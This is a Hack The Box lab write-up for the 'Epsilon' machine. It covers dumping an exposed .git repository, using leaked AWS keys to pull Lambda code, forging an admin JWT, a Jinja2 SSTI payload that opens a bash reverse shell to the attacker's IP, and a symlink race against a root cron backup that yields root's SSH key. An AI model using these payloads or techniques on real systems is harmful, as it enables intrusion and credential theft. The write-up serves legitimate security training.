---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: git gitdumper sourcecode aws flask python aws-lambda jwt ssti jinja2 serversidetemplateinjection burpsuite pspy64 crontab cronjob 
---

<br />

![1](../../../assets/images/Epsilon/1.png)

<br />

OS -> Linux.

Difficulty -> Medium.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

As always we are going to start with a `nmap` scan to enumerate the open ports and services running on the victim machine:

<br />

```bash
❯ nmap -p- 10.10.11.134 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 12:29 CEST
Nmap scan report for 10.10.11.134
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-title: 403 Forbidden
| http-git: 
|   10.10.11.134:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Updating Tracking API  # Please enter the commit message for...
|_http-server-header: Apache/2.4.41 (Ubuntu)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Costume Shop
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.86 seconds
```

<br />

Open Ports:

`Port 22` -> ssh 

`Port 80` -> http 

`Port 5000` -> http

<br />

# Http Enumeration: -> Port 5000

<br />

If we browse the website on the port 5000, we're presented with a login panel:

<br />

![3](../../../assets/images/Epsilon/3.png)

<br />

We tried default credentials such as `admin:admin` and basic SQL Injection trying to bypass the login, but without success.

<br />

# Http Enumeration: -> Port 80

<br />

There is a website running on the port 80, but attempting to access it returns a `403 forbidden` status code:

<br />

![2](../../../assets/images/Epsilon/2.png)

<br />

## .git exposed:

<br />

At first glance, it seems there isn't much we can do here.

However, upon analyzing the `nmap` output, we notice the presence of a `.git` directory on the web server.

Using the popular tool [git-dumper](https://github.com/arthaud/git-dumper), we can retrieve the repository with the following oneliner:

<br />

```bash
❯ python3 git_dumper.py http://10.10.11.134/.git EPSILON
```

<br />

Now, we can explore the directory and inspect the contents of the dumped `.git` repository:

<br />

```bash
❯ ls -la
drwxr-xr-x root root  64 B  Sat May 24 12:44:24 2025  .
drwxr-xr-x root root 196 B  Sat May 24 12:44:21 2025  ..
drwxr-xr-x root root 146 B  Sat May 24 12:45:34 2025  .git
.rw-r--r-- root root 1.6 KB Sat May 24 12:44:24 2025  server.py
.rw-r--r-- root root 1.1 KB Sat May 24 12:44:24 2025  track_api_CR_148.py
```

<br />

As we can see, there are some interesting Python scripts along with the usual `.git` directory.

To better understand everything, we will analyze both of them.

<br />

### server.py:

<br />

This script appears to be the source code of the website running on port 5000.

There are different functionalities with their own paths.

The first one is a function named `verify_jwt`, which is used to validate the admin's identity:

<br />

```python
secret = '<secret_key>'

def verify_jwt(token,key):
    try:
        username=jwt.decode(token,key,algorithms=['HS256',])['username']
        if username:
            return True
        else:
            return False
    except:
        return False
```

<br />

After that function, we have another one named `index`:

<br />

```python
@app.route("/", methods=["GET","POST"])
def index():
    if request.method=="POST":
        if request.form['username']=="admin" and request.form['password']=="admin":
            res = make_response()
            username=request.form['username']
            token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
            res.set_cookie("auth",token)
            res.headers['location']='/home'
            return res,302
        else:
            return render_template('index.html')
    else:
        return render_template('index.html')
```

<br />

In this function, we can see that the `admin:admin` credentials should work, but as we saw earlier, they didn't.

The `home` function renders the homepage after verifying the admin's `JWT` using the `verify_jwt` function.

<br />

```python
@app.route("/home")
def home():
    if verify_jwt(request.cookies.get('auth'),secret):
        return render_template('home.html')
    else:
        return redirect('/',code=302)
```

<br />

The `/track` route only implements auth verification for the POST request, but not for the GET one.

<br />

```python
@app.route("/track",methods=["GET","POST"])
def track():
    if request.method=="POST":
        if verify_jwt(request.cookies.get('auth'),secret):
            return render_template('track.html',message=True)
        else:
            return redirect('/',code=302)
    else:
        return render_template('track.html')
```

<br />

Finally, we have the `order` function.

This is the most interesting part, as it uses `user input` without any sanitization and renders it directly in a `template`.

This likely introduces an `SSTI` (Server Side Template Injection) vulnerability.

<br />

```python
@app.route('/order',methods=["GET","POST"])
def order():
    if verify_jwt(request.cookies.get('auth'),secret):
        if request.method=="POST":
            costume=request.form["costume"]
            message = '''
            Your order of "{}" has been placed successfully.
            '''.format(costume)
            tmpl=render_template_string(message,costume=costume)
            return render_template('order.html',message=tmpl)
        else:
            return render_template('order.html')
    else:
        return redirect('/',code=302)
```

<br />

### track_api_CR_148.py:

<br />

In the other script, we found what seems to be an `AWS` (Amazon Web Services) instance.

<br />

```python
import io
import os
from zipfile import ZipFile
from boto3.session import Session


session = Session(
    aws_access_key_id='<aws_access_key_id>',
    aws_secret_access_key='<aws_secret_access_key>',
    region_name='us-east-1',
    endpoint_url='http://cloud.epsilon.htb')
aws_lambda = session.client('lambda')


def files_to_zip(path):
    for root, dirs, files in os.walk(path):
        for f in files:
            full_path = os.path.join(root, f)
            archive_name = full_path[len(path) + len(os.sep):]
            yield full_path, archive_name


def make_zip_file_bytes(path):
    buf = io.BytesIO()
    with ZipFile(buf, 'w') as z:
        for full_path, archive_name in files_to_zip(path=path):
            z.write(full_path, archive_name)
    return buf.getvalue()


def update_lambda(lambda_name, lambda_code_path):
    if not os.path.isdir(lambda_code_path):
        raise ValueError('Lambda directory does not exist: {0}'.format(lambda_code_path))
    aws_lambda.update_function_code(
        FunctionName=lambda_name,
        ZipFile=make_zip_file_bytes(path=lambda_code_path))
```

<br />

Most of the important information, such as the `AWS` credentials, is removed.

We can only take note of the `cloud.epsilon.htb` subdomain and add it to our `/etc/hosts` file.

<br />

## Analyzing Commits:

<br />

At this point, we can analyze the past commits of the dumped repository trying to find some information leakage.

The `git log` command shows 4 different commits:

<br />

```bash
❯ git log
commit c622771686bd74c16ece91193d29f85b5f9ffa91 (HEAD -> master)
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 17:41:07 2021 +0000

    Fixed Typo

commit b10dd06d56ac760efbbb5d254ea43bf9beb56d2d
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:02:59 2021 +0000

    Adding Costume Site

commit c51441640fd25e9fba42725147595b5918eba0f1
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:58 2021 +0000

    Updatig Tracking API

commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module

```

<br />

Let's inspect the first commit added to the repository:

<br />

```bash
❯ git show 7cf92a7a09e523c1c667d13847c9ba22464412f3
commit 7cf92a7a09e523c1c667d13847c9ba22464412f3
Author: root <root@epsilon.htb>
Date:   Wed Nov 17 10:00:28 2021 +0000

    Adding Tracking API Module

diff --git a/track_api_CR_148.py b/track_api_CR_148.py
new file mode 100644
index 0000000..fed7ab9
--- /dev/null
+++ b/track_api_CR_148.py
@@ -0,0 +1,36 @@
+import io
+import os
+from zipfile import ZipFile
+from boto3.session import Session
+
+
+session = Session(
+    aws_access_key_id='AQLA5M37BDN6FJP76TDC',
+    aws_secret_access_key='OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A',
+    region_name='us-east-1',
+    endpoint_url='http://cloud.epsilong.htb')
+aws_lambda = session.client('lambda')    
+
+
+def files_to_zip(path):
+    for root, dirs, files in os.walk(path):
+        for f in files:
+            full_path = os.path.join(root, f)
+            archive_name = full_path[len(path) + len(os.sep):]
+            yield full_path, archive_name
+
+
```

<br />

Great! We discovered `AWS` credentials in the output.

We can set them using the `aws configure` command to interact with `cloud.epsilon.htb` subdomain:

<br />

### AWS Enumeration:

<br />

```bash 
❯ aws configure
AWS Access Key ID [****************test]: AQLA5M37BDN6FJP76TDC
AWS Secret Access Key [****************test]: OsK0o/glWwcjk2U3vVEowkvq5t4EiIreB+WdFo1A
Default region name [us-east-1]:        
Default output format [test]: json
```

<br />

The first thing we try is to enumerate `AWS` buckets.

<br />

```bash 
❯ aws s3 ls s3:// --endpoint-url http://cloud.epsilon.htb

An error occurred (400) when calling the ListBuckets operation: Bad Request
```

<br />

Unfortunately, the request returned a `400 Bad Request` error.

If we recall, there was something related to `lambda` in the `track_api_CR_148.py` source code.

Running `aws help` we can see that it's a lambda option in the output, and if we run a `aws lambda help` we see an interesting flag, `list-functions`, which enumerates available Lambda functions:

<br />

```bash 
❯ aws lambda list-functions --endpoint-url http://cloud.epsilon.htb
{
    "Functions": [
        {
            "FunctionName": "costume_shop_v1",
            "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
            "Runtime": "python3.7",
            "Role": "arn:aws:iam::123456789012:role/service-role/dev",
            "Handler": "my-function.handler",
            "CodeSize": 478,
            "Description": "",
            "Timeout": 3,
            "LastModified": "2025-05-24T10:30:13.205+0000",
            "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
            "Version": "$LATEST",
            "VpcConfig": {},
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "436a4229-7c8b-4584-85a0-63bbcb657b2f",
            "State": "Active",
            "LastUpdateStatus": "Successful",
            "PackageType": "Zip"
        }
    ]
}
```

<br />

One available function is named `"costume_shop_v1"`.

Using `get-function` along with the `--function-name` option, we can retrieve more detailed information about it:

<br />

```bash
❯ aws lambda get-function --function-name=costume_shop_v1 --endpoint-url http://cloud.epsilon.htb
{
    "Configuration": {
        "FunctionName": "costume_shop_v1",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:costume_shop_v1",
        "Runtime": "python3.7",
        "Role": "arn:aws:iam::123456789012:role/service-role/dev",
        "Handler": "my-function.handler",
        "CodeSize": 478,
        "Description": "",
        "Timeout": 3,
        "LastModified": "2025-05-24T10:30:13.205+0000",
        "CodeSha256": "IoEBWYw6Ka2HfSTEAYEOSnERX7pq0IIVH5eHBBXEeSw=",
        "Version": "$LATEST",
        "VpcConfig": {},
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "436a4229-7c8b-4584-85a0-63bbcb657b2f",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip"
    },
    "Code": {
        "Location": "http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code"
    },
    "Tags": {}
}
```

<br />

At the end of the output, there is an `URL` that points to a source.

We can download this file using `wget`:

<br />

```bash 
❯ wget http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
--2025-05-24 14:58:30--  http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code
Resolviendo cloud.epsilon.htb (cloud.epsilon.htb)... 10.10.11.134
Conectando con cloud.epsilon.htb (cloud.epsilon.htb)[10.10.11.134]:80... conectado.
Petición HTTP enviada, esperando respuesta... 200 
Longitud: 478 [application/zip]
Grabando a: «code»

code                                          100%[================================================================================================>]     478  --.-KB/s    en 0s      

2025-05-24 14:58:30 (44,0 MB/s) - «code» guardado [478/478]
```

<br />

The downloaded file is a `ZIP` archive:

<br />

```bash
❯ file code
code: Zip archive data, at least v2.0 to extract, compression method=deflate
```

<br />

After unzipping it, we find a Python script named `"lambda_function.py"`.

<br />

```bash
❯ unzip code
Archive:  code
  inflating: lambda_function.py
```

<br />

### lambda_function.py:

<br />

The code is not particularly relevant, it only contains a hardcoded `secret`:

<br />

```python
import json

secret='RrXCv`mrNe!K!4+5`wYq' #apigateway authorization for CR-124

'''Beta release for tracking'''
def lambda_handler(event, context):
    try:
        id=event['queryStringParameters']['order_id']
        if id:
            return {
               'statusCode': 200,
               'body': json.dumps(str(resp)) #dynamodb tracking for CR-342
            }
        else:
            return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
    except:
        return {
                'statusCode': 500,
                'body': json.dumps('Invalid Order ID')
            }
```

<br />

## Costume Login Bypass:

<br />

If we recall, some functions in `server.py` were using a `JWT` generated with the following line:

<br />

```python
token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
```

<br />

This line creates an `admin` token using a secret key.

Maybe we can use the discovered `secret` to create this `token`.

To test this, I used the following simple Python 3 script:

<br />

```python
#!/usr/bin/env python3

from termcolor import colored
import jwt

secret = "RrXCv`mrNe!K!4+5`wYq"

token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
print(colored(f"\n[+] Here you have your admin token to log into the web application -> {token}\n", "red"))
```

<br />

Running the script generates the admin token:

<br />

```bash
[+] Here you have your admin token to log into the web application -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.WFYEm2-bZZxe2qpoAtRPBaoNekx-oOwueA80zzb3Rc4
```

<br />

Now, we can set the `token` using the browser's `DevTools` to bypass the login mechanism:

<br />

![4](../../../assets/images/Epsilon/4.png)

<br />

With the valid `JWT` token in place, we can now access the `/home` path as the admin user and reach restricted areas of the application.

<br />

![5](../../../assets/images/Epsilon/5.png)

<br />

## SSTI (Server Side Template Injection):

<br />

When analyzing the `server.py` script, we identified the `/order` route as potentially vulnerable to Server-Side Template Injection (SSTI).

Given its potential for exploitation, we decided to prioritize testing this functionality.

After clicking on the `Order` link in the navigation menu, the following form is displayed:

<br />

![6](../../../assets/images/Epsilon/6.png)

<br />

To test the functionality, we select a different `costume`, fill in all the fields, and click the `"Order"` button:



<br />

![7](../../../assets/images/Epsilon/7.png)

<br />

As we can see, the value of the `costume` field is reflected in the output.

This is promising, because if we can manipulate this field, we may be able to exploit a potential `SSTI` vulnerability.

{% raw %}
For instance, submitting `{{7*7}}` in the `Costume` field should render `49` in the confirmation message if SSTI is present.
{% endraw %}

To test this, we intercept the request using Burp Suite:

<br />

![8](../../../assets/images/Epsilon/8.png)

<br />

{% raw %}
Once the request is intercepted, we simply modify the `costume` field to inject the payload `{{7*7}}`.
{% endraw %}

And if we check the output...

<br />

![9](../../../assets/images/Epsilon/9.png)

<br />

Great! The result of the expression is reflected in the response.

This confirms that the application is vulnerable to `SSTI`.

After some time testing `Jinja2` payloads, I find one in [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/598d2ca3fac9e462b0cecfac114bd969b4ce61ee/Server%20Side%20Template%20Injection#jinja2---remote-code-execution) that allow us to run a command:

<br />

{% raw %}
```python 
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```
{% endraw %}
![10](../../../assets/images/Epsilon/10.png)

<br />

We can now execute commands on the server as the `tom` user.

At this point, we can launch a `reverse shell` to gain full access to the system with the following payload:

<br />

{% raw %}
```python 
{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"').read() }}
```
{% endraw %}

<br />

We need to `URL-encode` the ampersand `(&)` as it would otherwise break the request.

Once the request is submitted, we can check our listener:

<br />

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.134] 38060
bash: cannot set terminal process group (956): Inappropriate ioctl for device
bash: no job control in this shell
tom@epsilon:/var/www/app$ id
id
uid=1000(tom) gid=1000(tom) groups=1000(tom)
```

<br />

We now have a shell as the `tom` user.

And we can retrieve the `user.txt` flag:

<br />

```bash
tom@epsilon:/$ cd /home/tom
tom@epsilon:~$ cat user.txt
fabadbf5cf23291b89cb14f093xxxxxx
```

<br />

# Privilege Escalation: tom -> root

<br />

Once inside the system, we execute `pspy64` to monitor processes and identify any scheduled `cron jobs` running at regular intervals.

<br />

```bash
tom@epsilon:/tmp/Privesc$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
...[snip]...
2025/05/25 11:49:01 CMD: UID=0     PID=2133   | /bin/bash /usr/bin/backup.sh
...[snip]...

```

<br />

### backup.sh:

<br />

Reviewing the `pspy64` output, we identify a bash script `/usr/bin/backup.sh` executed as `root` via a cron job.

To investigate further, we examine the contents of the script:

<br />

```bash
#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*
```

<br />

1.- Deletes all contents from `/opt/backups`.

2.- Creates a tar archive on `/opt/backups` containing the contents of `/var/www/app` directory.

3.- Generates a file named `/opt/backups/checksum` containing the `SHA1` hash of the created tar archive.

4.- Waits for 5 seconds.

5.- Creates another tar archive using the `-h` flag (which follows symbolic links). It includes the `checksum` file and the previously created backup, and stores it in `/var/backups/web_backups/`.

6.- Deletes all contents in `/opt/backups` again to clean up.

<br />

## Exploit 

<br />

As we mentioned before, the second `tar` command includes the `-h` flag.

<br />

```bash
tom@epsilon:/tmp/Privesc$ tar --help | grep h 
...[snip]...
-h, --dereference          follow symlinks; archive and dump the files they
...[snip]...
```

<br />

This means that if we can replace the `checksum` file with a symbolic link pointing to a `root` owned directory or file, it will be followed and archived by the cron job, giving us access to its contents.

To exploit this behavior, we can use the following `Bash` script:



<br />

```bash
#!/bin/bash 

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Leaving the program...${endColour}\n"
  tput cnorm; exit 1
 }

echo -e "\n${yellowColour}[+]${endColour} ${grayColour}Waiting for the checksum file creation...${endColour}"

tput civis
while true; do 
  if [ -e "/opt/backups/checksum" ]; then 
    rm -rf /opt/backups/checksum 
    echo -e "${yellowColour}[+]${endColour} ${grayColour}Deleting the checksum file...${endColour}"
    ln -s -f /root /opt/backups/checksum
    echo -e "${yellowColour}[+]${endColour} ${grayColour}Replacing checksum file by a malicious one...${endColour}"
    echo -e "${yellowColour}[+]${endColour} ${grayColour}Exploited successfully!${endColour}\n"
    tput cnorm 
    exit 0
  fi
done
```

<br />

We run the exploit:

<br />

```bash
tom@epsilon:/tmp/Privesc$ bash escalation.sh

[+] Waiting for the checksum file creation...
[+] Deleting the checksum file...
[+] Replacing checksum file by a malicious one...
[+] Exploited successfully!
```

<br />

And if we check the `/var/backups/web_backups` directory, we can confirm that the last backup created is bigger than the others.

```bash
tom@epsilon:/var/backups/web_backups$ ls -l
total 81392
-rw-r--r-- 1 root root  1003520 May 25 12:30 596683368.tar
-rw-r--r-- 1 root root  1003520 May 25 12:31 614471425.tar
-rw-r--r-- 1 root root  1003520 May 25 12:32 633946377.tar
-rw-r--r-- 1 root root 80332800 May 25 12:33 649703684.tar
```

<br />

So we copy it to `/tmp`:

<br />

```bash
cp 649703684.tar /tmp
```

<br />

Finally, we extract its contents:

<br />

```bash
tar -xf 649703684.tar
tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted 
tar: Exiting with failure status due to previous errors
```

<br />

Despite the error, we can still access the extracted content. `Checksum` is the `/root` directory:

<br />

```bash
tom@epsilon:/tmp$ cd opt/backups/checksum/
tom@epsilon:/tmp/opt/backups/checksum$ ls -la
total 60
drwx------  9 tom tom 4096 May 25 11:35 .
drwxrwxr-x  3 tom tom 4096 May 25 12:37 ..
drwxr-xr-x  2 tom tom 4096 Dec 20  2021 .aws
-rw-r--r--  1 tom tom 3106 Dec  5  2019 .bashrc
drwx------  4 tom tom 4096 Dec 20  2021 .cache
drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .config
-rw-r--r--  1 tom tom   33 Nov 17  2021 .gitconfig
drwxr-xr-x  3 tom tom 4096 Dec 20  2021 .local
drwxr-xr-x 36 tom tom 4096 May 25 11:35 .localstack
-rw-r--r--  1 tom tom  161 Dec  5  2019 .profile
drwx------  2 tom tom 4096 Dec 20  2021 .ssh
-rw-r--r--  1 tom tom  356 Nov 17  2021 docker-compose.yml
-rwxr-xr-x  1 tom tom  453 Nov 17  2021 lambda.sh
-rw-r-----  1 tom tom   33 May 25 11:35 root.txt
drwxr-xr-x  2 tom tom 4096 Dec 20  2021 src
```

<br />

Now, we can get the root `id_rsa` and connect to localhost as superuser:

<br />

```bash
tom@epsilon:/tmp/opt/backups/checksum/.ssh$ ssh -i id_rsa root@localhost
...[snip]...
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)
...[snip]...
root@epsilon:~# cat root.txt
8dc5fcd7c973ef75d6341885a8xxxxxx
```

<br />

Machine pwned! I hope you learned a lot and understood all the concepts.

Keep hacking! ❤️❤️

<br />
